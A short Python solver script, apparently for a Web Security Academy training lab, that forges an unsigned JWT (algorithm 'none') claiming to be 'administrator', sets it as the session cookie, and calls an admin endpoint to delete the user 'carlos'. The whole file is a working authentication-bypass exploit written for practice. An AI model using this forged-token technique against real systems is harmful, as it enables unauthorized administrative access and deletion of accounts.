from web_security_academy.core.logger import logger
import jwt


def solve_lab(session):
    payload = {"sub": "administrator"}
    token = jwt.encode(payload, "", algorithm="none")
    session.cookies.set("session", token)
    logger.info("Set the session cookie as an unsigned JWT of the following JSON:")
    logger.info(payload)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
